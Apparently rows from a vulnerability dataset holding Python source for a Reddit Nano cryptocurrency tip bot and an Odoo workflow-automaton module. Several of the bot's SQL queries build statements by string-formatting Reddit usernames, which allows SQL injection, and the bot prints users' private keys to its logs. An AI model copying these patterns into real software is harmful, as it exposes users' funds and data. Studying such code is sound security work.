                if new_message.name[:3] == 't4_':
                    yield ('message', new_message)

        else:
            yield None


def update_history():
    return None


def add_history_record(username=None, action=None, sql_time=None, address=None, comment_or_message=None,
                       recipient_username=None, recipient_address=None, amount=None, hash=None, comment_id=None,
                       notes=None, reddit_time=None, comment_text=None):
    if sql_time is None:
        sql_time = time.strftime('%Y-%m-%d %H:%M:%S')

    sql = ""INSERT INTO history (username, action, sql_time, address, comment_or_message, recipient_username, "" \
          ""recipient_address, amount, hash, comment_id, notes, reddit_time, comment_text) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)""

    val = (username, action, sql_time, address, comment_or_message, recipient_username, recipient_address, amount,
           hash, comment_id, notes, reddit_time, comment_text)

    mycursor.execute(sql, val)
    mydb.commit()
    return mycursor.lastrowid


def check_registered_by_address(address):
    address = address.split('_')[1]
    mycursor.execute(""SELECT username FROM accounts WHERE address='%s'"" % ('xrb_' + address))
    result = mycursor.fetchall()
    if len(result) > 0:
        return result[0][0]

    mycursor.execute(""SELECT username FROM accounts WHERE address='%s'"" % ('nano_' + address))
    result = mycursor.fetchall()
    if len(result) > 0:
        return result[0][0]

    return None

#updated
def add_new_account(username):
    address = generate_account()
    private = address['private']
    address = address['account']
    print(type(private), type(address), type(username))
    print(private, address, username)
    sql = ""INSERT INTO accounts (username, private_key, address, minimum) VALUES (%s, %s, %s, %s)""
    val = (username, private, address, nano_to_raw(0.01))
    mycursor.execute(sql, val)
    mydb.commit()
    return address


def handle_create(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        action='create',
        comment_text=str(message.body)[:255]
    )

    username = str(message.author)
    mycursor.execute(""SELECT address FROM accounts WHERE username='%s'"" % username)
    result = mycursor.fetchall()
    if len(result) is 0:
        address = add_new_account(username)
        response = ""Hi! I have created a new account for you. Your Nano address is %s. Once Nano is sent to your new account,"" \
                   "" your balance will be"" \
                   "" unpocketed until you respond and have 'receive' in the message body.\n\nhttps://www.nanode.co/account/%s"" % (address, address)
    else:
        response = ""It looks like you already have an account made. Your Nano address is %s. Once Nano is sent to your account, your balance will be"" \
                 "" unpocketed until you respond and have 'receive' in the message body.\n\nhttps://www.nanode.co/account/%s"" % (result[0][0], result[0][0])
    x = reddit.redditor(username).message('Nano Tipper Z: Account Creation', response)
    # message.reply(response)


# currently deactivated
def handle_private_key(message):
    author = str(message.author)
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        action='private_key',
        comment_text=str(message.body)[:255]
    )
    mycursor.execute(""SELECT address, private_key FROM accounts WHERE name='%s'"" %author)
    result = mycursor.fetchall()
    if len(result) > 0:
        response = 'Your account: %s\n\nYour private key: %s'%(result[0][0],result[0][1])
        x = reddit.redditor(username).message('New Private Key', response)
        return None
    else:
        x = reddit.redditor(username).message(""No account found."",""You do not currently have an account open.""
                                                                ""To create one, respond with the text 'create' in the message body."")
        return None


#updated
def handle_balance(message):
    username = str(message.author)
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        action='balance',
        comment_text=str(message.body)[:255]
    )

    mycursor.execute(""SELECT address FROM accounts WHERE username='%s'"" % username)
    result = mycursor.fetchall()
    if len(result)>0:
        results = check_balance(result[0][0])

        response = ""At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new "" \
                   ""message containing the word 'receive'\n\nhttps://www.nanode.co/account/%s"" % (result[0][0], results[0]/10**30, results[1]/10**30,result[0][0])
        reddit.redditor(username).message('Nano Tipper Z account balance', response)
        return None

    reddit.redditor(username).message('Nano Tipper Z: No account registered.', 'You do not have an open account yet')

# currently deactivated
def handle_new_address(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        action='new_address',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        comment_text=str(message.body)[:255]
    )
    message.reply('not activated yet.')


#updated
def handle_send(message):
    parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')
    response = handle_send_nano(message, parsed_text, 'message')
    message.reply(response + comment_footer)


#updated
def handle_send_nano(message, parsed_text, comment_or_message):
    user_or_address = '' # either 'user' or 'address', depending on how the recipient was specified
    private_key = ''
    adrress = ''
    recipient = ''
    recipient_username = ''
    recipient_address = ''
    message_time = datetime.utcfromtimestamp(message.created_utc) # time the reddit message was created
    username = str(message.author) # the sender

    entry_id = add_history_record(
        username=username,
        action='send',
        comment_or_message=comment_or_message,
        comment_id=message.id,
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        comment_text=str(message.body)[:255]
        )

    # check if the message body was parsed into 2 or 3 words. If it wasn't, update the history db
    # with a failure and return the message. If the length is 2 (meaning recipient is parent author) we will
    # check that after tip amounts to limit API requests
    if len(parsed_text) >= 3:
        amount = parsed_text[1]
        recipient = parsed_text[2]
    elif len(parsed_text) == 2:
        # parse the user info in a later block of code to minimize API requests
        pass
    else:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('could not find tip amount', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return 'Could not read your tip or send command, or find an amount. Be sure the amount and recipient are separated by a space.'


    # check that the tip amount is a number, and if it is high enough
    # we will also check if the tip amount is above the user minimum after we get user information
    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('could not parse amount', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return ""Could not read your tip or send amount. Is '%s' a number?"" % parsed_text[1]

    try:
        amount = float(parsed_text[1])
    except:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('could not parse amount', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return ""Could not read your tip or send amount. Is '%s' a number?"" % parsed_text[1]

    if amount < program_minimum:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('amount below program limit', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return 'You must send amounts of Nano above the program limit of %s.' % program_minimum

    # check if author has an account, and if they have enough funds
    mycursor.execute(""SELECT address, private_key FROM accounts WHERE username='%s'"" % username)
    result = mycursor.fetchall()
    if len(result) < 1:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('sender does not have an account', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        return 'You do not have a tip bot account yet. To create one, send me a PM containing the'\
               "" text 'create' in the message body, or get a tip from a fellow redditor!.""
    else:
        address = result[0][0]
        private_key = result[0][1]
        results = check_balance(result[0][0])
        if nano_to_raw(amount) > results[0]:
            sql = ""UPDATE history SET notes = %s WHERE id = %s""
            val = ('insufficient funds', entry_id)
            mycursor.execute(sql, val)
            mydb.commit()
            return 'You have insufficient funds. Your account has %s pocketed (+%s unpocketed) and you are '\
                          'trying to send %s. If you have unpocketed funds, create a new message containing the text'\
                          ' ""receive"" to pocket your incoming money.'%(results[0]/10**30, results[1]/10**30, amount)

    # if there was only the command and the amount, we need to find the recipient.
    # if it was a comment, the recipient is the parent author
    # if it was a message, the program will respond with an error
    if len(parsed_text) == 2:
        if comment_or_message == 'comment':
            recipient = str(message.parent().author)
        else:
            sql = ""UPDATE history SET notes = %s, WHERE id = %s""
            val = (""no recipient specified"", entry_id)
            mycursor.execute(sql, val)
            mydb.commit()
            return ""You must specify an amount and a user.""

    # remove the /u/ if a redditor was specified
    if recipient[:3].lower() == '/u/':
        recipient = recipient[3:]
        print(recipient)

    # recipient -- first check if it is a valid address. Otherwise, check if it's a redditor
    if (recipient[:5].lower() == ""nano_"") or (recipient[:4].lower() == ""xrb_""):
        # check valid address
        success = validate_address(recipient)
        if success['valid'] == '1':
            user_or_address = 'address'
        # if not, check if it is a redditor disguised as an address (e.g. nano_is_awesome, xrb_for_life)
        else:
            try:
                print(getattr(reddit.redditor(recipient), 'is_suspended', False))
                user_or_address = 'user'
            except:
                # not a valid address or a redditor
                sql = ""UPDATE history SET notes = %s WHERE id = %s""
                val = ('invalid address or address-like redditor does not exist', entry_id)
                mycursor.execute(sql, val)
                mydb.commit()
                return '%s is neither a valid address or redditor' % recipient
    else:
        try:
            print(getattr(reddit.redditor(recipient), 'is_suspended', False))
            user_or_address = 'user'
        except:
            sql = ""UPDATE history SET notes = %s WHERE id = %s""
            val = ('redditor does not exist', entry_id)
            mycursor.execute(sql, val)
            mydb.commit()
            return ""Could not find redditor %s. Make sure you aren't writing or copy/pasting markdown."" % recipient

    # at this point:
    # 'amount' is a valid positive number and above the program minimum
    # 'username' has a valid account and enough Nano for the tip
    # 'user_or_address' is either 'user' or 'address',
    # 'recipient' is either a valid redditor or a valid Nano address

    user_minimum = -1
    # if a user is specified, reassign that as the username
    if user_or_address == 'user':
        #try to get the username information
        recipient_username = recipient
        sql = ""SELECT minimum, address FROM accounts WHERE username = %s""
        val = (recipient_username,)
        mycursor.execute(sql, val)
        myresult = mycursor.fetchall()
        # if there is a result, pull out the minimum (in raw) and nano address for the recipient
        if len(myresult) > 0:
            print(myresult[0])
            user_minimum = int(myresult[0][0])
            recipient_address = myresult[0][1]
    else:
        # if the recipient is an address, check if they have an account
        recipient_address = recipient
        recipient_username = check_registered_by_address(recipient_address)
        if recipient_username:
            sql = ""SELECT minimum, address FROM accounts WHERE username = %s""
            val = (recipient_username,)
            mycursor.execute(sql, val)
            myresult = mycursor.fetchall()
            print(myresult[0])
            user_minimum = float(myresult[0][0])

    # if either we had an account or address which has been registered, recipient_address and recipient_username will
    # have values instead of being ''. We will check the minimum
    if (user_minimum >= 0) and recipient_address and recipient_username:
        if nano_to_raw(amount) < user_minimum:
            sql = ""UPDATE history SET notes = %s WHERE id = %s""
            val = (""below user minimum"", entry_id)
            mycursor.execute(sql, val)
            mydb.commit()

            return ""Sorry, the user has set a tip minimum of %s. Your tip of %s is below this amount.""%(user_minimum/10**30, amount)

        if user_or_address == 'user':
            notes = ""sent to registered redditor""
        else:
            notes = ""sent to registered address""

        receiving_new_balance = check_balance(recipient_address)
        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s""
        val = (notes, address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        print(""Sending Nano: "", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)
        sent = send(address, private_key, nano_to_raw(amount), recipient_address)
        print(""Hash: "", sent)
        sql = ""UPDATE history SET hash = %s WHERE id = %s""
        val = (sent['hash'], entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        x = reddit.redditor(recipient_username).message('You just received a new Nano tip!',
                                                    'You have been tipped %s Nano at your address of %s. Your new account balance will be '
                                                    '%s received and %s unpocketed.' % (
                                                    amount, recipient_address, receiving_new_balance[0] / 10 ** 30,
                                                    (receiving_new_balance[1] / 10 ** 30 + amount)))

        if user_or_address == 'user':
            return ""Sent %s Nano to %s."" % (amount, recipient_username)
        else:
            return ""Sent %s Nano to %s."" % (amount, recipient_address)

    elif recipient_address:
        # or if we have an address but no account, just send
        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_address = %s, amount = %s WHERE id = %s""
        val = (
            'sent to unregistered address', address, username, recipient_address, str(nano_to_raw(amount)), entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        print(""Sending Unregistered Address: "", address, private_key, nano_to_raw(amount), recipient_address)

        sent = send(address, private_key, nano_to_raw(amount), recipient_address)
        print(""Hash: "", sent)
        sql = ""UPDATE history SET hash = %s WHERE id = %s""
        val = (sent['hash'], entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return ""Sent %s Nano to address %s."" % (amount, recipient_address)

    else:
        # create a new account for redditor
        recipient_address = add_new_account(recipient_username)


        x = reddit. \
            redditor(recipient_username). \
            message('Congrats on receiving your first Nano Tip!',
                    'Welcome to Nano Tip Bot! You have just received a Nano tip in the amount of %s at your address '
                    'of %s. Here is some boilerplate.\n\n' % (
                    amount, recipient_address) + help_text)

        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s""
        val = (
        ""new user created"", address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        sent = send(address, private_key, nano_to_raw(amount), recipient_address)
        print(""Hash: "", sent)

        sql = ""UPDATE history SET hash = %s WHERE id = %s""
        val = (sent['hash'], entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        print(""Sending New Account Address: "", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)
        return ""Creating a new account for %s and ""\
                      ""sending %s Nano."" % (recipient_username, amount)


def handle_receive(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)
    username = str(message.author)
    # find any accounts associated with the redditor
    mycursor.execute(""SELECT address, private_key FROM accounts WHERE username='%s'"" % username)
    result = mycursor.fetchall()
    if len(result) > 0:

        open_or_receive(result[0][0], result[0][1])
        balance = check_balance(result[0][0])
        add_history_record(
            username=username,
            action='receive',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            address=result[0][0],
            comment_or_message='message'
        )
        response = ""You currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new "" \
                   ""message containing the word 'receive' in the body"" % (balance[0] / 10 ** 30, balance[1] / 10 ** 30)
        message.reply(response)
    else:
        add_history_record(
            username=username,
            action='receive',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            comment_or_message='message'
        )
        response = ""You do not currently have an account open. To create one, respond with the text 'create' in the message body.""
        message.reply(response)

# updated
def handle_minimum(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    # user may select a minimum tip amount to avoid spamming. Tipbot minimum is 0.001
    username = str(message.author)
    # find any accounts associated with the redditor
    parsed_text = message.body.replace('\\', '').split('\n')[0].split(' ')

    # there should be at least 2 words, a minimum and an amount.
    if len(parsed_text) < 2:
        response = ""I couldn't parse your command. I was expecting 'minimum <amount>'. Be sure to check your spacing.""
        message.reply(response)
        return None
    # check that the minimum is a number

    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):
        response = ""'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.""
        message.reply(response)
    try:
        amount = float(parsed_text[1])
    except:
        response = ""'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.""
        message.reply(response)

    # check that it's greater than 0.01
    if nano_to_raw(amount) < nano_to_raw(0.01):
        response = ""The overall tip minimum is 0.01 Nano.""
        message.reply(response)

    # check if the user is in the database
    sql = ""SELECT address FROM accounts WHERE username=%s""
    val = (username, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    print(result)
    if len(result) > 0:
        #open_or_receive(result[0][0], result[0][1])
        #balance = check_balance(result[0][0])
        add_history_record(
            username=username,
            action='minimum',
            amount=nano_to_raw(amount),
            address=result[0][0],
            comment_or_message='message',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            comment_text=str(message.body)[:255]
        )
        sql = ""UPDATE accounts SET minimum = %s WHERE username = %s""
        print(amount)
        print(nano_to_raw(amount))
        val = (str(nano_to_raw(amount)), username)
        print(val)
        mycursor.execute(sql, val)
        mydb.commit()
        response = ""Updating tip minimum to %s""%amount
        message.reply(response)
    else:
        add_history_record(
            username=username,
            action='minimum',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            amount=nano_to_raw(amount),
            comment_text=str(message.body)[:255]
        )
        response = ""You do not currently have an account open. To create one, respond with the text 'create' in the message body.""
        message.reply(response)


# updated
def handle_help(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        action='help',
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S')
        )
    response = help_text
    message.reply(response)


# updated
def handle_comment(message):
    # remove an annoying extra space that might be in the front
    if message.body[0] == ' ':
        parsed_text = str(message.body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')
    else:
        parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')
    print(parsed_text)
    print(len(parsed_text))
    response = handle_send_nano(message, parsed_text, 'comment')
    message.reply(response + comment_footer)


def handle_message(message):
    message_body = str(message.body).lower()
    print(""Body: **"", message_body, ""**"")
    if message.body[0] == ' ':
        parsed_text = str(message.body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')
    else:
        parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')
    print(""Parsed Text:"", parsed_text)

    if parsed_text[0].lower() == 'help':
        print(""Helping"")
        handle_help(message)

    elif parsed_text[0].lower() == 'minimum':
        print(""Setting Minimum"")
        handle_minimum(message)

    elif parsed_text[0].lower() == 'create':
        print(""Creating"")
        handle_create(message)

    elif parsed_text[0].lower() == 'private_key':
        print(""private_keying"")
        # handle_private_key(message)

    elif parsed_text[0].lower() == 'new_address':
        print(""new address"")
        # handle_new_address(message)

    elif parsed_text[0].lower() == 'send':
        print(""send via PM"")
        handle_send(message)

    elif parsed_text[0].lower() == 'receive':
        print(""receive"")
        handle_receive(message)

    elif parsed_text[0].lower() == 'balance':
        print(""balance"")
        handle_balance(message)
    else:
        add_history_record(
            username=str(message.author),
            comment_text=str(message.body)[:255],
            comment_or_message='message',
        )


# main loop
for action_item in stream_comments_messages():
    if action_item is None:
        pass
        #print('No news.')
    elif action_item[0] == 'comment':
        print(time.strftime('%Y-%m-%d %H:%M:%S'))
        print('Comment: ', action_item[1].author, action_item[1].body[:20])
        if action_item[1].body[0]==' ':
            parsed_text = str(action_item[1].body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')
        else:
            parsed_text = str(action_item[1].body).lower().replace('\\', '').split('\n')[0].split(' ')
        print('Parsed comment: ', parsed_text)
        if parsed_text[0] == r'!nano_tip':
            print('\n')
            print('*****************************************************')
            print('found an item.')
            handle_comment(action_item[1])

    elif action_item[0] == 'message':
        if action_item[1].author == 'nano_tipper_z':
            pass
        else:
            print(time.strftime('%Y-%m-%d %H:%M:%S'))
            print('A new message was found %s, sent by %s.'%(action_item[1], action_item[1].author ))
            handle_message(action_item[1])



/n/n/n",1
162,162,521850b74dd7c2a7e21bfde6d362db605c478a91,"base_crapo_workflow/mixins/crapo_automata_mixins.py/n/n# ©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).
import logging

from odoo import fields, api, exceptions, _
from odoo import SUPERUSER_ID
from odoo.tools.safe_eval import safe_eval

from .crapo_readonly_view_mixin import ReadonlyViewMixin


class ObjectWithStateMixin(ReadonlyViewMixin):
    """"""
        Mixin class that can be used to define an Odoo Model eligible
        to be managed by a Crapo Automaton

        Should be use as a mixin class in existing objects
    """"""

    _readonly_domain = (
        ""[('crapo_readonly_fields', 'like', ',{},'.format(field_name))]""
    )
    _readonly_fields_to_add = [""crapo_readonly_fields""]

    automaton = fields.Many2one(
        comodel_name=""crapo.automaton"",
        string=""Related automaton"",
        help=(
            ""The automaton describes the various transitions ""
            ""an object can go through between states.""
        ),
        default=lambda self: self._get_model_automaton(),
        store=True,
        index=True,
        required=True,
    )

    state = fields.Many2one(
        comodel_name=""crapo.state"",
        help=""""""State in which this object is"""""",
        track_visibility=""onchange"",
        domain=lambda self: self._get_state_domain(),
        group_expand=""_read_group_states"",
        default=lambda self: self._get_default_state(),
        store=True,
        index=True,
        required=True,
    )

    crapo_readonly_fields = fields.Char(
        compute=""_compute_crapo_readonly_fields"", default="",0,""
    )

    @api.depends(""state"")
    @api.onchange(""state"")
    def _compute_crapo_readonly_fields(self):
        for rec in self:
            if rec.state.readonly_fields:
                rec.crapo_readonly_fields = "",{},"".format(
                    rec.state.readonly_fields
                )
            else:
                rec.crapo_readonly_fields = "",0,""

    # Computes automaton for current model
    @api.model
    def _get_model_automaton(self):
        automaton_model = self.env[""crapo.automaton""]

        my_model = self.env[""ir.model""].search(
            [(""model"", ""="", self._name)], limit=1
        )
        my_automaton = automaton_model.search(
            [(""model_id"", ""="", my_model.id)], limit=1
        )

        if my_automaton:
            return my_automaton
        else:
            return automaton_model.create(
                {
                    ""name"": ""Automaton for {}"".format(self._name),
                    ""model_id"": my_model.id,
                }
            )

    # State Management
    def _get_state_domain(self, domain=None):
        result = []

        if self.automaton:
            result.append((""automaton"", ""="", self.automaton.id))
        else:
            result.append((""automaton"", ""="", self._get_model_automaton().id))

        return result

    def _get_default_state(self):
        domain = self._get_state_domain()
        state_model = self.env[""crapo.state""]
        automaton = self._get_model_automaton()

        if automaton:
            domain.append(""|"")
            domain.append((""is_start_state"", ""="", True))
            domain.append((""default_state"", ""="", 1))

        default_state = state_model.search(domain, limit=1)

        if default_state:
            return default_state
        elif automaton:
            return state_model.create(
                {""name"": ""New"", ""automaton"": automaton.id}
            )
        else:
            return False

    def _next_states(self):
        self.ensure_one()
        domain = self._get_state_domain()

        next_states = False
        if self.automaton:
            eligible_transitions = self.env[""crapo.transition""].search(
                [
                    (""automaton"", ""="", self.automaton.id),
                    (""from_state"", ""="", self.state.id),
                ]
            )

            target_ids = eligible_transitions.mapped(lambda x: x.to_state.id)

            if target_ids:
                domain.append((""id"", ""in"", target_ids))

                next_states = self.env[""crapo.state""].search(domain)

        else:
            domain.append((""sequence"", "">"", self.state.sequence))
            next_states = self.env[""crapo.state""].search(domain, limit=1)

        return next_states

    def _read_group_states(self, states, domain, order):
        search_domain = self._get_state_domain(domain=domain)
        state_ids = states._search(
            search_domain, order=order, access_rights_uid=SUPERUSER_ID
        )
        return states.browse(state_ids)

    # =================
    # Write / Create
    # =================
    @api.multi
    def write(self, values):
        """"""
            Override write method in order to preventing transitioning
            to a non eligible state
        """"""
        # Look for a change of state
        target_state_id = None
        result = True

        if ""state"" in values:
            target_state_id = values[""state""]

        # check if there is a change state needed
        if target_state_id is not None:
            # Search for elected transition
            transition = self._get_transition(target_state_id)

            if transition:
                result = True

                if transition.write_before:
                    result = super(ObjectWithStateMixin, self).write(values)

                self.exec_conditions(transition.preconditions, ""Pre"")
                self.exec_action(transition.action, transition.async_action)
                self.exec_conditions(transition.postconditions, ""Post"")

                # Return now if write has already been done
                if transition.write_before:
                    return result

        return super(ObjectWithStateMixin, self).write(values)

    def _get_transition(self, target_state_id):
        """"""
            Retrieve transition between two state
        """"""
        # Check if next state is valid
        current_state = False
        for rec in self:
            next_states = rec._next_states()
            if rec.state.id == target_state_id:
                current_state = rec.state
                continue
            elif not next_states:
                raise exceptions.ValidationError(
                    _(""No target state is elegible for transitionning"")
                )
            elif target_state_id not in next_states.ids:
                raise exceptions.ValidationError(
                    _(""State is not in eligible target states"")
                )
            elif current_state is not False and current_state != rec.state:
                raise exceptions.ValidationError(
                    _(""Transitionning is not possible from differents states"")
                )
            else:
                current_state = rec.state

        # Search for elected transition
        transition = self.env[""crapo.transition""].search(
            [
                (""from_state"", ""="", current_state.id),
                (""to_state"", ""="", target_state_id),
            ],
            limit=1,
        )

        return transition

    def exec_conditions(self, conditions, prefix):
        """"""
            Execute Pre/Postconditions.

            conditions: must be a safe_eval expression
            prefix: a string to indicate if it's pre or post conditions
        """"""
        if conditions:
            for rec in self:
                try:
                    is_valid = safe_eval(
                        conditions, {""object"": rec, ""env"": self.env}
                    )
                except Exception as err:
                    logging.error(
                        ""CRAPO: Failed to validate transition %sconditions: %s"",
                        prefix,
                        str(err),
                    )
                    is_valid = False

                # Raise an error if not valid
                if not is_valid:
                    raise exceptions.ValidationError(
                        _(""Invalid {}-conditions for Object: {}"").format(
                            prefix, rec.display_name
                        )
                    )

    def exec_action(self, action, async_action):
        if action:
            context = {
                ""active_model"": self._name,
                ""active_id"": self.id,
                ""active_ids"": self.ids,
            }
            if async_action:
                action.with_delay().run_async(context)
            else:
                action.with_context(context).run()


class StateObjectMixin(object):
    """"""
    Mixin class that can be used to define a state object
    that can be used as a crapo_state

    Should be use as a mixin class in existing objects
    """"""

    automaton = fields.Many2one(
        comodel_name=""crapo.automaton"",
        default=lambda self: self._get_default_automaton(),
        store=True,
        required=True,
        index=True,
    )

    default_state = fields.Boolean(
        help=""Might be use as default stage."", default=False, store=True
    )

    # Transitions (inverse relations)

    transitions_to = fields.One2many(
        string=""Incomint transitions"",
        comodel_name=""crapo.transition"",
        inverse_name=""to_state"",
    )

    transitions_from = fields.One2many(
        string=""Outgoing transitions"",
        comodel_name=""crapo.transition"",
        inverse_name=""from_state"",
    )
    # computed field to identify start and end states

    is_start_state = fields.Boolean(
        ""Start State"",
        compute=""_compute_is_start_state"",
        store=True,
        index=True,
    )

    is_end_state = fields.Boolean(
        ""End State"", compute=""_compute_is_end_state"", store=True, index=True
    )

    readonly_fields = fields.Char(
        help=""List of model's fields name separated by comma""
    )

    @api.depends(""transitions_to"", ""automaton"")
    def _compute_is_start_state(self):
        for record in self:
            if (
                len(record.transitions_to) == 0
                or record.transitions_to is False
            ):
                record.is_start_state = True
            else:
                record.is_start_state = False

    @api.depends(""transitions_from"", ""automaton"")
    def _compute_is_end_state(self):
        for record in self:
            if (
                len(record.transitions_to) == 0
                or record.transitions_to is False
            ):
                record.is_end_state = True
            else:
                record.is_end_state = False

    def _do_search_default_automaton(self):
        return False

    @api.model
    def _get_default_automaton(self):
        default_value = 0
        if ""current_automaton"" in self.env.context:
            try:
                default_value = int(self.env.context.get(""current_automaton""))
            except Exception:
                default_value = 0
        else:
            return self._do_search_default_automaton()

        return self.env[""crapo.automaton""].browse(default_value)


class WrappedStateMixin(StateObjectMixin):
    """"""
    Mixin class that can be used to define a state object that
    wraps an existing model defining a state for another model

    The wrapped object can be used as a crapo_state

    Should be use as a mixin class in existing objects
    """"""

    _inherits = {""crapo.state"": ""crapo_state""}

    crapo_state = fields.Many2one(
        comodel_name=""crapo.state"",
        string=""Related Crapo State"",
        store=True,
        index=True,
        required=True,
        ondelete=""cascade"",
    )

    def _do_search_default_automaton(self):
        """"""
        finds or creates the default automaton (one per model)
        """"""
        automaton_model = self.env[""crapo.automaton""]
        my_model = self.env[""ir.model""].search(
            [(""model"", ""="", self._state_for_model)], limit=1
        )
        my_automaton = automaton_model.search([(""model_id"", ""="", my_model.id)])
        if not my_automaton:
            my_automaton = automaton_model.create(
                {
                    ""name"": ""Automaton for {}"".format(self._state_for_model),
                    ""model_id"": my_model.id,
                }
            )
        return my_automaton

    def _compute_related_state(
        self, values={}
    ):  # pylint: disable=dangerous-default-value
        """"""
        Create a new crapo_state for an existing record of the WrappedState
        """"""
        my_automaton = self._do_search_default_automaton()

        if not self.crapo_state:
            if not my_automaton:
                return False
            else:
                if ""name"" not in values:
                    values[""name""] = ""Default State for %s"" % self.id
                values[""automaton""] = my_automaton.id
                return self.env[""crapo.state""].create(values)
/n/n/nbase_crapo_workflow/mixins/crapo_readonly_view_mixin.py/n/n# ©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).
import logging

from lxml import etree
from lxml.builder import E

from odoo.tools.safe_eval import safe_eval
from odoo.osv import expression


class ReadonlyViewMixin(object):
    """"""
        Mixin class that can be used to set a whole view readonly with domains
    """"""

    _readonly_domain = []
    _readonly_fields_to_add = []

    def _fields_view_get(
        self, view_id=None, view_type=""form"", toolbar=False, submenu=False
    ):
        """"""
            Override to add crapo_readonly_fields to arch and attrs readonly
            on fields that could be editable
        """"""
        result = super(ReadonlyViewMixin, self)._fields_view_get(
            view_id, view_type, toolbar, submenu
        )

        readonly_fields = self.fields_get(attributes=[""readonly""])
        node = etree.fromstring(result[""arch""])
        for field in self._readonly_fields_to_add:
            node.append(E.field(name=field, invisible=""1""))

        if not isinstance(self._readonly_domain, (list, tuple)):
            lst_domain = [self._readonly_domain]
        else:
            lst_domain = self._readonly_domain

        self._process_field(node, readonly_fields, lst_domain)
        result[""arch""] = etree.tostring(node)
        return result

    def _process_field(self, node, readonly_fields, lst_domain):
        """"""
            Add readnoly attrs if needed
        """"""
        if node.get(""readonly_global_domain""):
            lst_domain = lst_domain + [node.get(""readonly_global_domain"")]

        if node.tag == ""field"":
            field_name = node.get(""name"")

            attrs = safe_eval(node.get(""attrs"", ""{}""))
            readonly = attrs.get(""readonly"") or node.get(""readonly"")
            if isinstance(readonly, str):
                readonly = safe_eval(node.get(""readonly"", ""{}""))

            # Deal with none domain value, if field is explicitly in readonly we skip
            if not isinstance(readonly, (list, tuple)) and readonly:
                return
            # If there is no domain define and fields is already in readonly
            # we skip too
            elif readonly is None and readonly_fields[field_name][""readonly""]:
                return

            _readonly_domain = expression.OR(
                [
                    safe_eval(domain, {""field_name"": field_name})
                    for domain in lst_domain
                ]
            )
            if readonly:
                _readonly_domain = expression.OR([readonly, _readonly_domain])

            attrs[""readonly""] = _readonly_domain
            node.set(""attrs"", str(attrs))

        else:
            for child_node in node:
                self._process_field(child_node, readonly_fields, lst_domain)
/n/n/nbase_crapo_workflow/models/automaton_transition.py/n/n# ©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

from odoo import fields, models, exceptions, api, _


class StateMachineTransition(models.Model):
    """"""
    A transition between two states
    """"""

    _name = ""crapo.transition""
    _description = ""Transition between two states""

    @api.constrains(""postconditions"", ""async_action"")
    def async_action_post_conditions_conflict(self):
        """"""
            Checks that no post-condition is set when using an async action
        """"""
        for rec in self:
            if rec.async_action and rec.postconditions:
